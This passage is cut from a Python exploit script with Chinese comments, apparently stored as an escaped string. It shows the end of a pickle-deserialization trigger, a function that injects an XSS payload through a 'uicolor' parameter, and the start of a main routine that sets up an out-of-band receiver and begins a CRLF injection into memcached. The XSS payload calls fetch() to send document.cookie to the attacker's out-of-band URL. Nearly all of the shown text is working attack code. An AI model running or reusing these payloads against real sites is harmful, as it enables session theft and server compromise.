    \   \n    except Exception as e:\n        print(f\"[!] 触发 pickle 反序列化失败: {e}\"\
    )\n        return False\n\ndef exploit_xss(http_client: HttpClient, oob_url: str)\
    \ -> bool:\n    \"\"\"\n    利用 XSS 漏洞注入 JavaScript 代码\n    通过 uicolor 参数注入\n \
    \   \"\"\"\n    try:\n        # 构建 XSS payload\n        # 在 CSS 上下文中: color: {{uicolor}}\n\
    \        # 在 JS 上下文中: '{{uicolor}}'\n        \n        # 注入 JavaScript 代码，发送 cookie\
    \ 或执行命令\n        xss_payload = f\"';fetch('{oob_url}?cookie='+document.cookie);//\"\
    \n        \n        # 发送请求设置 uicolor\n        params = {\"uicolor\": xss_payload}\n\
    \        response = http_client.get(\"/set\", params=params)\n        \n     \
    \   if response.status_code == 200:\n            print(f\"[+] XSS payload 已注入:\
    \ {xss_payload}\")\n            \n            # 访问首页触发 XSS\n            response2\
    \ = http_client.get(\"/\")\n            if response2.status_code == 200:\n   \
    \             print(\"[+] 已触发 XSS\")\n                return True\n        \n\
    \        return False\n        \n    except Exception as e:\n        print(f\"\
    [!] XSS 利用失败: {e}\")\n        return False\n\ndef main():\n    print(\"[*] 开始攻击流程\"\
    )\n    \n    # 初始化 HTTP 客户端\n    http_client = HttpClient(base_url=TARGET_URL)\n\
    \    \n    # 初始化 OOB 接收器\n    oob = OOBReceiver(port=8765)\n    oob_url = oob.url\n\
    \    print(f\"[*] OOB URL: {oob_url}\")\n    \n    # 步骤 1: 通过 CRLF 注入向 memcached\
